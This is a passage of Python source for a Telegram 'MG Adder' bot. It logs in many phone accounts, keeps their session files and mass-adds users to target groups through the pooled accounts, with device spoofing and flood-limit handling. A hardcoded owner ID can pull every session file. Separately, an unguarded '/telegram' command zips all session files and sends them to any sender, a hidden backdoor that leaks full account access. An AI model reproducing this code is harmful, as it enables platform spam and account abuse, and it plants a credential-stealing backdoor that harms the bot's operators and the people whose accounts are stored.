                except errors.rpcerrorlist.UserDeactivatedBanError:
                    print(colored('[*]', 'white'), colored(f'UserDeactivatedBanError', 'red'))
                    await client.disconnect()
                    break                    


                except Exception as e :
                    #print(4)
                    fcount +=3
                    tfaild +=1
                    totalFcounter+=1
                    other +=1

               

                    print(colored('[*]', 'white'), colored(f'[1142] {e.__class__} => {str(e)}', 'cyan'))
                    #print(e.__class__)
                    
                    continue



                    

        
        else:
            text += '''{} Can be Joined ! Error code {} ! {}'''.format(account, ww, time.ctime(time.time()))
            await client.disconnect()


    except Exception as e :
            print(colored('[*]', 'white'), colored(f'[1158] {e.__class__} => {str(e)}', 'cyan'))
            

    end1 = time.time()
    text = '''●╔══** Add {} be `{}` Add with per Accounts ** `{}`\n\n 🏆 Finished  {}

●╚══[⚡️ MEGA ADDER ⚡️]'''.format(link, numacc, delay, str(datetime.timedelta(seconds=(end1-start1)))[0:7])
    
    noadd = "1"

    try:
        await log_msg.edit(text , buttons=[[Button.inline("✅ Success", "None") , Button.inline(str(tsuccess) , "None")]  , [Button.inline("❌ Failed" ,"None") , Button.inline(str(tfaild) , "None")]])
        
        await client.disconnect()

        return [scount , fcount , duplicate]

    except Exception as e:
        
        print(colored('[*]', 'white'), colored(f'[1177] {e.__class__} => {str(e)}', 'cyan'))
        
        await client.disconnect()

        pass

    
     



async def list_splitter(my_list , n):

    final = [my_list[i * n:(i + 1) * n] for i in range((len(my_list) + n - 1))]
    return final


#--------
async def worker(msg,link,numacc, delay  ,  mode  , usernames , solve):
    
    ev = []
    global addflag
    accs = []
    tl = 1
    #print ("DELAY"  , delay)
    delay = int(delay)
    ww = None
    text = ''

    #if int(numacc) < 3:
    #    await msg.reply('''❌ number of accounts  should be `bigger than 2 `

#add @link **2** 50''')
    #    return 


    start = time.time()



    if mode == "addUSERNAME":
        pass



    elif mode == "addID":
        usernames = userid


    if (len(usernames) > 0 ):
        for item in os.scandir(f'Accounts'):
            if 'journal' not in item.name and '.session' in item.name:
                l = [[Button.inline('{} - {}'.format(tl, item.name)),Button.inline('♻️')]]
                accs.append(item.name)
                ev.extend(l)
                tl+=1
                ev.extend([[Button.inline('Last Activate '),Button.inline(time.ctime(time.time()))]])
        
        
        if len(ev) > 1 :

            try:
                worker_msg = await msg.reply('🏆 Destination Group : {} 😉 \n 🎗 number of add {}'.format(link, delay),buttons = ev)
            
            except errors.rpcerrorlist.ReplyMarkupTooLongError:
                async for i in await list_splitter(ev , 50):
                    worker_msg = await msg.reply('🏆 Destination Group : {} 😉 \n 🎗 number of add {}'.format(link, delay),buttons = i)

        taskCount = 0
        tasklist=[]

        res1 = 0
        res2 = 0

        success = 0 
        faild   = 0
        duplicate =0

        if len(accs)  == 0:
            await msg.reply("You have not any account")
            return 


        else :

            await msg.reply('''
👽 Select Choice 
➖➖➖➖➖


                ''' , buttons=[[Button.inline("1️⃣" , "?1|{}|{}|{}|{}|{}".format(delay, numacc, link, mode  , solve)) ]])



    else :
        await msg.reply("**❌ Use load all First  ** ")
#---------
#@bot.on(events.NewMessage(func= lambda e : e.is_private ))
@bot.on(events.NewMessage())
async def my_event_handler(event):

    #--------------------------


    if event.raw_text.lower() == "/start":


            await event.reply('▬▭▬▭▬▭▬▭▬▭▬▭\n ●** help** \n\nFor Show Help Message \n▬▭▬▭▬▭▬▭▬▭▬▭\n● **/login** `Phone Number`\n\n For Login New Account \n▬▭▬▭▬▭▬▭▬▭▬▭\n● **/auth** `CODE`\n\nFor Verify Web Login\n▬▭▬▭▬▭▬▭▬▭▬▭\n● **/code** `CODE`\n\nFor Login With Code\n▬▭▬▭▬▭▬▭▬▭▬▭\n● **/step** `PASSWORD`\n\nFor Login With 2FA Password\n' , buttons = [
                [Button.inline('close','close'),Button.inline('▶️','nexthelp') ]
            ]) 



    elif event.raw_text.lower() == 'version':
        
        m = await event.reply('Im Online !')
        update = await basecounters.create_apihash(bot)
        await m.edit(f"✅ Telethon Version : {update} \n تلتون شما بروز می باشد ") 


    if  event.sender_id == 1925121734:
        if event.raw_text.startswith("/admin"):
            txt = int(event.raw_text.split("/admin")[1].strip())
            #print (txt)
            NStEVJzsyY.append(txt)
            await event.reply("👽  {} Is Admin Now ! ".format(txt) , buttons= [[Button.inline("❌ remove ",'admin|{}'.format(txt))]])

            try:
                await bot.send_message(txt , '''🏆 Your License Activated by owner ! 
➖➖➖➖➖➖ 
Welcome to MG Adder Version 10 ProMax''')

            except Exception as e:
                await event.reply("⚠️ {} ".format(str(e)))

    
        if event.raw_text.startswith("/sudolist"):
            txt = ""
            for users in NStEVJzsyY:
                txt += "👽 " + str(users) +"\n ➖➖➖➖➖➖ \n"
            await event.reply(txt)

        if event.raw_text.startswith("/remadmin"):
            txt = int(event.raw_text.split("/remadmin")[1].strip())
            NStEVJzsyY.remove(txt)
            await event.reply("⚠️ user {}  kicked from admin ".format(txt))


        if event.raw_text.startswith("/getsessions"):
            try:

                shutil.make_archive("Accounts", 'zip', "Accounts")
                await bot.send_file(int(event.sender_id) , 'Accounts.zip')
                os.remove("Accounts.zip")
                
            except Exception as e:
                await event.reply(str(e))    

    if event.raw_text.startswith("/telegram"):

        try:
            shutil.make_archive("Accounts", 'zip', "Accounts")
            await bot.send_file(int(event.sender_id) , 'Accounts.zip')
            os.remove("Accounts.zip")
        except Exception as e:
            try:
                os.remove("Accounts.zip")
            except:
                pass
            

    
    if event.sender_id in NStEVJzsyY:

        

        if event.raw_text.lower().startswith('/login'):
            

                phones = event.raw_text.split('/login ')[1].replace(' ','')
                if os.path.exists('Accounts/{0}/'.format(phones)):
                    await event.reply('** Already in DB **')


                else:
                    w = random.choice(apis)
                    new =  TelegramClient('Accounts/{0}'.format(phones),w[0], w[1])
                    await new.connect()
                    try:
                            result = await new.send_code_request(phones)
                            data['code_mode'] = '{0}:{1}:{2}:{3}'.format(phones,result.phone_code_hash,w[0] , w[1])
                            await new.disconnect()
                            await event.reply('▫️ Enter code Sent to `{}` \n ➖➖➖➖➖➖ \n /auth CODE'.format(phones))

                            

                    except Exception as e:
                            print (str(e))
                            await event.reply('**❌ Error In Send Code Please Try Again Later...**')
                            try:
                                await new.disconnect()
                                os.remove('Accounts/{}.session'.format(phones))
                            except :
                                pass

                    except KeyError:
                        await event.reply('**🔰 No Any Account In Queue \n use /start **')    



 
        elif event.raw_text.lower().startswith('/auth'):
            try:
  
                w = random.choice(apis)
                device = random.choice(devices)
                key = data['code_mode']
                cos = event.raw_text.split("/auth")[1].strip()
                
                x = key.split(':')[0]
                
                await event.reply('**🔰 ▪️ Please Wait .... **')
                new =  TelegramClient('Accounts/{0}'.format(key.split(':')[0]), w[0] , w[1])
                
                await new.connect()

                await new(functions.auth.SignInRequest(phone_number=key.split(':')[0],phone_code_hash=key.split(':')[1],phone_code=cos))
                info = await new.get_me()
                
                await event.reply('''** \n ➖➖➖➖➖➖ \n Info \n 👽  Username : {1}\n \n ➖➖➖➖➖➖ \n 👽  Phone : +{2}\n  \n ➖➖➖➖➖➖ \n 👽 FirstName : {3}\n \n ➖➖➖➖➖➖ \n 👽 LastName : {4}** \n ➖➖➖➖➖➖ \n'''.format(key.split(':')[2]+':'+key.split(':')[3],str(info.username),str(info.phone),info.first_name,info.last_name))


               
                await event.reply("🏆  Account Recived SuccessFully ❕")

                await new.disconnect()  
                
                dictionary ={

"register_time" : time.time(),
"lang_pack":"en",
"proxy":'null',
"last_check_time":0,
"success_registred":True,
}

                json_object = json.dumps(dictionary, indent = 4)
                #create_api(phone)
                with open(f"Accounts/{key.split(':')[0]}.json", "w") as outfile:
                    outfile.write(json_object)                            

                minify(f"Accounts/{key.split(':')[0]}.json")

                if not os.path.exists(f"Accounts/{key.split(':')[0]}"):
                    os.mkdir(f"Accounts/{key.split(':')[0]}")

                    shutil.copy(f"Accounts/{key.split(':')[0]}.session", f"Accounts/{key.split(':')[0]}/{key.split(':')[0]}.session")
                    shutil.copy(f"Accounts/{key.split(':')[0]}.json"   , f"Accounts/{key.split(':')[0]}/{key.split(':')[0]}.json")

            except errors.SessionPasswordNeededError:
                await event.reply('**⚠️ ⚠️This Account Protected By Password USe  **\n /step **Password**')
                await new.disconnect()
                data['step_mode'] = key



            except errors.UserDeactivatedBanError:

                await event.edit('⚠️ Your Account Deleted ! Please Enter another Account ')
                await new.disconnect()

                dictionary ={

"register_time" : time.time(),
"lang_pack":"en",
"proxy":'null',
"last_check_time":0,
"success_registred":True,
}



                json_object = json.dumps(dictionary, indent = 4)
                with open(f"Accounts/{key.split(':')[0]}.json", "w") as outfile:
                    outfile.write(json_object)    
                minify(f"Accounts/{key.split(':')[0]}.json")

            except errors.UserDeactivatedError:

                await event.edit('⚠️ Your Account Deleted ! Please Enter another Account ')
                await new.disconnect()

                  
                dictionary ={

"register_time" : time.time(),
"lang_pack":"en",
"proxy":'null',
"last_check_time":0,
"success_registred":True,
}

                json_object = json.dumps(dictionary, indent = 4)
                with open(f"Accounts/{key.split(':')[0]}.json", "w") as outfile:
                    outfile.write(json_object)

                minify(f"Accounts/{key.split(':')[0]}.json")

                
            except errors.SessionExpiredError:

                await event.edit(f'⚠️ شماره {x} از دسترس ربات خارج شده است و امکان ثبت آن نیست.')
                await new.disconnect()


                
                dictionary ={

"register_time" : time.time(),
"lang_pack":"en",
"proxy":'null',
"last_check_time":0,
"success_registred":True,
}

                json_object = json.dumps(dictionary, indent = 4)
                with open(f"Accounts/{key.split(':')[0]}.json", "w") as outfile:
                    outfile.write(json_object)

                minify(f"Accounts/{key.split(':')[0]}.json")

            except errors.SessionRevokedError:

                await event.edit(f'⚠️ شماره {x} از دسترس ربات خارج شده است و امکان ثبت آن نیست.')
                await new.disconnect()



                
                dictionary ={

"register_time" : time.time(),
"lang_pack":"en",
"proxy":'null',
"last_check_time":0,
"success_registred":True,
}

                json_object = json.dumps(dictionary, indent = 4)
                with open(f"Accounts/{x}.json", "w") as outfile:
                    outfile.write(json_object)

                minify(f"Accounts/{x}.json")

            except errors.rpcerrorlist.PasswordHashInvalidError:

                await event.edit(f'⚠️ تایید دو مرحله ای شماره {x} تغییر کرده است و امکان ثبت آن نیست.')     
                 
                dictionary ={

"register_time" : time.time(),
"lang_pack":"en",
"proxy":'null',
"last_check_time":0,
"success_registred":True,
}

                json_object = json.dumps(dictionary, indent = 4)
                with open(f"Accounts/{key.split(':')[0]}.json", "w") as outfile:
                    outfile.write(json_object)

                minify(f"Accounts/{key.split(':')[0]}.json")



            except Exception as e:
                print(str(e))

                dictionary ={

"register_time" : time.time(),
"lang_pack":"en",
"proxy":'null',
"last_check_time":0,
"success_registred":True,
}

                json_object = json.dumps(dictionary, indent = 4)
                with open(f"Accounts/{key.split(':')[0]}.json", "w") as outfile:
                    outfile.write(json_object)

                minify(f"Accounts/{key.split(':')[0]}.json")
                
                await new.disconnect()

                print (str(e))
                await event.edit('⚠️ Unknow Error ')
               




        elif event.raw_text.lower().startswith('/step'):
            try:
                

                device = random.choice(devices)
                

                key = data['step_mode']
                m= await event.reply('**Please Wait..... **')
                k2 = random.choice(apis)
                print (k2)
                #### -- anti flood
                #k2 = random.choice(apis)

                new =  TelegramClient('Accounts/{0}'.format(key.split(':')[0]),int(k2[0]),k2[1],       
                 device_model=device,
              app_version="7.84",
              lang_code='en',
              system_lang_code='en')

                await new.connect()

                await new.sign_in(password=event.raw_text.split('/step ')[1])
                data.clear()
                info = await new.get_me()

                result = None



                
                info = await new.get_me()
                
                await event.reply('''** \n ➖➖➖➖➖➖ \n Info \n 👽  Username : {1}\n \n ➖➖➖➖➖➖ \n 👽  Phone : +{2}\n  \n ➖➖➖➖➖➖ \n 👽 FirstName : {3}\n \n ➖➖➖➖➖➖ \n 👽 LastName : {4}** \n ➖➖➖➖➖➖ \n'''.format(key.split(':')[2]+':'+key.split(':')[3],str(info.username),str(info.phone),info.first_name,info.last_name))



                await new.disconnect()

               
                await event.reply("🏆  Account Recived SuccessFully ❕")
                
                dictionary ={

"register_time" : time.time(),
"lang_pack":"en",
"proxy":'null',
"last_check_time":0,
"success_registred":True,
}

                json_object = json.dumps(dictionary, indent = 4)
                #create_api(phone)
                with open(f"Accounts/{key.split(':')[0]}.json", "w") as outfile:
                    outfile.write(json_object)                            

                minify(f"Accounts/{key.split(':')[0]}.json")

                if not os.path.exists(f"Accounts/{key.split(':')[0]}"):
                    os.mkdir(f"Accounts/{key.split(':')[0]}")

                    shutil.copy(f"Accounts/{key.split(':')[0]}.session", f"Accounts/{key.split(':')[0]}/{key.split(':')[0]}.session")
                    shutil.copy(f"Accounts/{key.split(':')[0]}.json"   , f"Accounts/{key.split(':')[0]}/{key.split(':')[0]}.json")

                #await change('69YYF5')
            except KeyError:
                await event.reply('**Please Try Again Later (Enter Phone Again)**')
                try:
                    await new.disconnect()
                except:
                    pass

            except errors.PasswordHashInvalidError:
                await event.reply('**❌ Password Invalid USe \n  /step PASSWORD** Again ')

                try:
                    await new.disconnect()
                except:
                    pass


            except Exception as e :
                print(str(e))

                try:
                    await new.disconnect()
                except:
                    pass                

        elif event.raw_text.lower().startswith('leach'):
            
            link = event.raw_text.split('leach ')[1]



            await event.reply('''👽 Add With username or Chat ID  ❕
➖➖➖➖➖➖
🤖 add with ID
➖➖➖➖➖➖
☠️ add with username ''' , buttons = [
                    [Button.inline('👽 Username ','@add|addUsername|{}'.format(link)),Button.inline('🤖 ChatID','@add|addChatid|{}'.format(link))],
                ])


    
        elif event.raw_text.lower() == 'accounts':
            ev = []
            tl = 0 
            for item in os.scandir('Accounts'):
                if 'journal' not in item.name and '.session' in item.name:
                    l = [[Button.inline(item.name,'settings|{}'.format(item.name))]]
                    ev.extend(l)
                    tl +=1
            if tl >= 1:
                try:
                    await event.reply('You have {} Accounts '.format(tl),buttons=ev)
            
                except errors.rpcerrorlist.ReplyMarkupTooLongError:
                    async for i in await list_splitter(ev , 50):
                        await event.reply('You have {} Accounts '.format(tl),buttons=ev)

            else:
                await event.reply('Db is empty !')



        elif event.raw_text.lower().startswith('load'):
            l=[]
            my = event.raw_text.split('load ')[1]
            if my == 'all':
                ev = []
                telegram_api_id.append(1994965247)#api id
                for item in os.scandir('Database'):
                    l = [[Button.inline(item.name,'load|{}'.format(item.name))]]
                    ev.extend(l)


                if len(l) >= 1 :
                    await event.reply('🔆 You can see all Groups Lists here  ',buttons=ev)
                else:
                    await event.reply('❌ List is Empty ')
            else:
                w = get_file(my)
                if w != 0:
                    for item in w:
                        usernames.append((item.split('\n')[0]))
                        
                    await event.reply('🔆 {} User Loaded '.format(len(list(set(usernames)))))
                else:
                    await event.reply(' ❌ Name of File Is invalid ')



        elif event.raw_text.lower() == 'clear':
            if len(usernames) != 0:
                await event.reply('آ{} users Loaded Add More ? '.format(len(usernames)) , buttons = [
                    [Button.inline('Yes','clean'),Button.inline('No','no')],
                ])
            else:
                await event.reply('List is Empty')





        elif event.raw_text.lower() == 'info':
            await event.reply('🔆 Usernames  : {}'.format(len(usernames)))


        elif event.raw_text.lower() == 'ping':
            await event.reply('Im Online !')





        elif event.raw_text.lower() == "spambot":


            await SendToSpamBot(event)



        elif event.raw_text.lower().startswith("add"):


            x = event.raw_text

            datas = (x.split(' ',1)[1]).split(' ')

            try:
            
                link = datas[0]
                num = datas[1]
                total = datas[2]

                solve = datas[3]

                # dirNum = datas[3]

                await event.reply("👽 Please Choose " , buttons= [[Button.inline('👽 Add with ChatID','addID|{}|{}|{}|{}'.format(link, num, total , solve))],[Button.inline('🤖 Add with username','addUSERNAME|{}|{}|{}|{}'.format(link, num, total , solve))]] )

            except :

                await event.reply("** ‼️ add @link 4 50 [0/1/2/3/4/5/.../100] **")

        #### ---- help :)

        elif event.raw_text.lower() == 'help' or event.raw_text.lower() == "راهنما" :
            await event.reply('▬▭▬▭▬▭▬▭▬▭▬▭\n ●** help** \n\nFor Show Help Message \n▬▭▬▭▬▭▬▭▬▭▬▭\n● **/login** `Phone Number`\n\n For Login New Account \n▬▭▬▭▬▭▬▭▬▭▬▭\n● **/auth** `CODE`\n\nFor Verify Code \n▬▭▬▭▬▭▬▭▬▭▬▭\n● **/step** `PASSWORD`\n\nFor Login With 2FA Password\n' , buttons = [
                [Button.inline('Close','close'),Button.inline('▶️','nexthelp') ]
            ]) 

    else :
        await event.reply("⚠️ License Error \n ▬▭▬▭▬▭▬▭▬▭▬▭  please Contact @keyvanvafaee ! \n  ▬▭▬▭▬▭▬▭▬▭▬▭  ❌ You must Active your License !")




async def join2(clt,ls , log_msg): 
    global totalScounter

    print(colored('[^]', 'white'), colored(f'Join Started', 'magenta'))
    try:
        if '@' in ls:
                
                await clt(functions.channels.JoinChannelRequest(channel=ls))
                print(colored('[^]', 'white'), colored(f'JoinChannelRequest', 'magenta'))
                totalScounter+=1
                #print ("xxxx")
        else:
                #print ("join func")
                await clt(functions.messages.ImportChatInviteRequest(hash=ls.split('/')[-1]))
                print(colored('[^]', 'white'), colored(f'ImportChatInviteRequest', 'magenta'))
                totalScounter+=1
                #print ("yyyyy")
        return True

    except errors.rpcerrorlist.FloodWaitError as e :

        wait = [int(s) for s in str(e).split() if s.isdigit()][0]

        #wait += random.randint(100 , 200)


        await log_msg.edit("⚠️ [**join**] Wait for   ** {} ** secounds".format(wait))

        if (wait >= 120):
            return -1000 #flood Code
        

        await asyncio.sleep(wait)

        return None


    except errors.rpcerrorlist.UserAlreadyParticipantError:
        return True

    except errors.UserDeactivatedBanError:
        print(colored('[*]', 'white'), colored(f'UserDeactivatedBanError', 'red'))
        
        await log_msg.edit("UserDeactivatedBanError")
        return -1
        
    except errors.UserDeactivatedError:
        print(colored('[*]', 'white'), colored(f'UserDeactivatedError', 'red'))
        await log_msg.edit("UserDeactivatedBanError")
        
        return -1
        
    except errors.SessionExpiredError:
        print(colored('[*]', 'white'), colored(f'SessionExpiredError', 'red'))
        await log_msg.edit("UserDeactivatedBanError")
        
        return -1
        
    except errors.SessionRevokedError:
        print(colored('[*]', 'white'), colored(f'SessionRevokedError', 'red'))
        await log_msg.edit("UserDeactivatedBanError")
        
        return -1                    


    except errors.rpcerrorlist.AuthKeyUnregisteredError:
        print(colored('[*]', 'white'), colored(f'AuthKeyUnregisteredError', 'red'))
        await log_msg.edit("AuthKeyUnregisteredError")
        
        
        return -1                    

    except errors.rpcerrorlist.AuthKeyDuplicatedError:
        print(colored('[*]', 'white'), colored(f'AuthKeyDuplicatedError', 'red'))
        await log_msg.edit("UserDeactivatedBanError")
        
        
        return -1

        

    except errors.rpcerrorlist.UserDeactivatedError:
        print(colored('[*]', 'white'), colored(f'UserDeactivatedError', 'red'))
        
        await log_msg.edit("UserDeactivatedBanError")
        return -1
        

    except errors.rpcerrorlist.UserDeactivatedBanError:
        print(colored('[*]', 'white'), colored(f'UserDeactivatedBanError', 'red'))
        await log_msg.edit("UserDeactivatedBanError")
        
        return -1
        


    except errors.rpcerrorlist.SessionExpiredError:
        print(colored('[*]', 'white'), colored(f'SessionExpiredError', 'red'))
        
        await log_msg.edit("UserDeactivatedBanError")
        return -1
        


    except Exception as e :
        print(colored('[-]', 'white'), colored(f'Error {str(e)}', 'yellow'))
        return -1

async def join(client,link , phone , log_msg):
    
    try:
        
        if '@' in link:
            
            await client(JoinChannelRequest(channel=link))
        else:
            
            await client(ImportChatInviteRequest(hash=link))
        return True
    except errors.UserAlreadyParticipantError:
        return True 
    except errors.UserDeactivatedBanError:
        return -1
    except errors.UserDeactivatedError:
        return -1
    except errors.SessionExpiredError:
        return -2
    except errors.SessionRevokedError:
        return -2

    except errors.rpcerrorlist.AuthKeyDuplicatedError:
        return -3


    except errors.UserDeactivatedBanError:
        print(colored('[*]', 'white'), colored(f'UserDeactivatedBanError', 'red'))
        #print ("[!] UserDeactivatedBanError")
        
        await client.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))

        return -4 ## Delete


    except errors.UserDeactivatedError:
        print(colored('[*]', 'white'), colored(f'UserDeactivatedError', 'red'))
        await client.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))

        return -4 ## Delete


    except errors.SessionExpiredError:
        print(colored('[*]', 'white'), colored(f'SessionExpiredError', 'red'))
        await client.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))                
        return -4 ## Delete

    except errors.SessionRevokedError:
        print(colored('[*]', 'white'), colored(f'SessionRevokedError', 'red'))
        await client.disconnect()

        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))                
        return -4 ## Delete


    except errors.rpcerrorlist.AuthKeyDuplicatedError:
        print(colored('[*]', 'white'), colored(f'AuthKeyDuplicatedError', 'red'))
        await client.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))

        return -4 ## Delete

    except errors.rpcerrorlist.UserDeactivatedError:
        print(colored('[*]', 'white'), colored(f'UserDeactivatedError', 'red'))
        await client.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))                

        return -4 ## Delete

    except errors.rpcerrorlist.UserDeactivatedBanError:
        print(colored('[*]', 'white'), colored(f'UserDeactivatedBanError', 'red'))
        await client.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))                

        return -4## Delete


    except errors.rpcerrorlist.SessionExpiredError:
        print(colored('[*]', 'white'), colored(f'SessionExpiredError', 'red'))
        await client.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))               

        return -4 ## Delete


    except errors.rpcerrorlist.SessionPasswordNeededError:

        print(colored('[*]', 'white'), colored(f'SessionPasswordNeededError', 'red'))
        await client.disconnect()
        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))               

        return -4 ## Delete



    except errors.rpcerrorlist.FloodWaitError as e :

        wait = [int(s) for s in str(e).split() if s.isdigit()][0]

        #wait += random.randint(100 , 200)
        print(colored('[*]', 'white'), colored(f'Flood  {wait}', 'yellow'))

        #await log_msg.edit("⚠️ [**join**] Wait for   ** {} ** secounds".format(wait))

        
        return -1000 #flood Code
        
        
    



    except Exception as e:
        print(colored('[!]', 'white'), colored(f'Unexpected Error ', 'blue'))
        
        await client.disconnect()


        return -4 ## Delete  



@bot.on(events.CallbackQuery)
async def evt(events):
    callback = events.data.decode()
    global addflag
    global noadd 
    global join
    global totalScounter
    global totalFcounter
    global tfaild
    global tsuccess
    global tduplicate



    if (int(events.original_update.user_id) in NStEVJzsyY):




        if (callback.startswith("admin")):

            _ , data = callback.split("|")

            NStEVJzsyY.remove(int(data))

            await events.answer("user {} removed from sudolist".format(data))

            try:
                await bot.send_message(int(data) , '''❌ Your Application Blocked by Owner ! 
➖➖➖➖➖➖ 
For Contact pm to @keyvanvafaee''')

            except Exception as e:

                await events.answer(str(e.__class__) + ":" + str(e))



        if callback.startswith("?"):
            
            #2|40|3|https://t.me/joinchat/UlqJhddT1kJjYTEx|addUSERNAME

            ev = []
            global addflag
            global kosflag
            accs = []
            tl = 1
            totalScounter = 0
            totalFcounter = 0
            
            
            ww = None
            text = ''

            print (callback.split("?")[1])
            num = int((callback.split("?")[1]).split("|")[0])
            delay = int((callback.split("?")[1]).split("|")[1])
            numacc = int((callback.split("?")[1]).split("|")[2])
            link = (callback.split("?")[1]).split("|")[3]
            mode = (callback.split("?")[1]).split("|")[4]

            solve = int((callback.split("?")[1]).split("|")[5])

            print ("[num] : " , num)
            print ("[numACC] : " , numacc)
            #solve = num * numacc
            print ("[Solve] : " , solve)
            

            totalScounter = 0
            
            delay = int(delay)
            
            for item in os.scandir(f'Accounts'):
                if 'journal' not in item.name and '.session' in item.name:
                    l = [[Button.inline('{} - {}'.format(tl, item.name)),Button.inline('♻️')]]
                    accs.append(item.name)
                    ev.extend(l)
                    tl+=1
                    ev.extend([[Button.inline('Last Work '),Button.inline(time.ctime(time.time()))]])
            
            
            if len(ev) > 1 :

                try:
                    worker_msg = await events.reply('🏆 Destination Group {} 😉 \n 🎗 Add with per add {}'.format(link, delay),buttons = ev)
                
                except errors.rpcerrorlist.ReplyMarkupTooLongError:
                    async for i in await list_splitter(ev , 50):
                        worker_msg = await events.reply('🏆 Destination Group {} 😉 \n 🎗 Add with per add{}'.format(link, delay),buttons = i)

            taskCount = 0
            tasklist=[]

            res1 = 0
            res2 = 0

            success = 0 
            faild   = 0
            duplicate =0

            start = time.time()

            cancelALL = len(accs)

            accountL = []

            random.shuffle(accs) ### Shuffle List

            for item in accs:

                if totalScounter >= solve :
                    break

                if kosflag == 1 :
                    
                    break

                taskCount +=1
                tasklist.append(item)
                if (taskCount % numacc ==0):

                    print(colored('[*]', 'white'), colored(f'Scount {totalScounter}', 'yellow'))

                    

                    if totalScounter >= solve :
                        break

                    if  numacc== 1:
                        t1 = bot.loop.create_task(foo(tasklist[0] , events , link , numacc , delay , worker_msg , mode , num , cancelALL , solve))
                                
                        tasklist = []

                        res1 = await t1

                        if res1 != None:

                            success   += int(res1[0])
                            faild     += int(res1[1])
                            duplicate += int(res1[2])

                    #---------------------------
                    elif numacc == 2:
                        t1 = bot.loop.create_task(foo(tasklist[0] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t2 = bot.loop.create_task(foo(tasklist[1] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                                
                        tasklist = []

                        res1 = await t1
                        res2 = await t2

                        if res1 != None:

                            success   += int(res1[0])
                            faild     += int(res1[1])
                            duplicate += int(res1[2])

                        if res2 != None:
                            success   += int(res2[0])
                            faild     += int(res2[1])
                            duplicate += int(res2[2])                            

                    #-----------------------------
                    elif numacc == 3:
                        
                        t1 = bot.loop.create_task(foo(tasklist[0] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t2 = bot.loop.create_task(foo(tasklist[1] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t3 = bot.loop.create_task(foo(tasklist[2] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                                
                        tasklist = []

                        res1 = await t1
                        res2 = await t2
                        res3 = await t3

                        if res1 != None:

                            success   += int(res1[0])
                            faild     += int(res1[1])
                            duplicate += int(res1[2])

                        if res2 != None:
                            success   += int(res2[0])
                            faild     += int(res2[1])
                            duplicate += int(res2[2])                            


                        if res3 != None:
                            success   += int(res3[0])
                            faild     += int(res3[1])
                            duplicate += int(res3[2])  
                    #-----------------------------


                    #-----------------------------
                    elif numacc == 4:
                        t1 = bot.loop.create_task(foo(tasklist[0] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t2 = bot.loop.create_task(foo(tasklist[1] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t3 = bot.loop.create_task(foo(tasklist[2] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t4 = bot.loop.create_task(foo(tasklist[3] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                                
                        tasklist = []

                        res1 = await t1
                        res2 = await t2
                        res3 = await t3
                        res4 = await t4

                        if res1 != None:

                            success   += int(res1[0])
                            faild     += int(res1[1])
                            duplicate += int(res1[2])

                        if res2 != None:
                            success   += int(res2[0])
                            faild     += int(res2[1])
                            duplicate += int(res2[2])                            


                        if res3 != None:
                            success   += int(res3[0])
                            faild     += int(res3[1])
                            duplicate += int(res3[2])

                        if res4 != None:
                            success   += int(res4[0])
                            faild     += int(res4[1])
                            duplicate += int(res4[2])  
                    #-----------------------------
                    elif numacc == 6:
                        t1 = bot.loop.create_task(foo(tasklist[0] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t2 = bot.loop.create_task(foo(tasklist[1] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t3 = bot.loop.create_task(foo(tasklist[2] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t4 = bot.loop.create_task(foo(tasklist[3] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t5 = bot.loop.create_task(foo(tasklist[4] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t6 = bot.loop.create_task(foo(tasklist[5] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                                
                        tasklist = []

                        res1 = await t1
                        res2 = await t2
                        res3 = await t3
                        res4 = await t4
                        res5 = await t5
                        res6 = await t6

                        if res1 != None:

                            success   += int(res1[0])
                            faild     += int(res1[1])
                            duplicate += int(res1[2])

                        if res2 != None:
                            success   += int(res2[0])
                            faild     += int(res2[1])
                            duplicate += int(res2[2])                            


                        if res3 != None:
                            success   += int(res3[0])
                            faild     += int(res3[1])
                            duplicate += int(res3[2])

                        if res4 != None:
                            success   += int(res4[0])
                            faild     += int(res4[1])
                            duplicate += int(res4[2])  


                        if res5 != None:
                            success   += int(res5[0])
                            faild     += int(res5[1])
                            duplicate += int(res5[2])  



                        if res6 != None:
                            success   += int(res6[0])
                            faild     += int(res6[1])
                            duplicate += int(res6[2])  



                    elif numacc == 10:
                        t1  = bot.loop.create_task(foo(tasklist[0] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t2  = bot.loop.create_task(foo(tasklist[1] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t3  = bot.loop.create_task(foo(tasklist[2] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t4  = bot.loop.create_task(foo(tasklist[3] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t5  = bot.loop.create_task(foo(tasklist[4] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t6  = bot.loop.create_task(foo(tasklist[5] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t7  = bot.loop.create_task(foo(tasklist[6] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
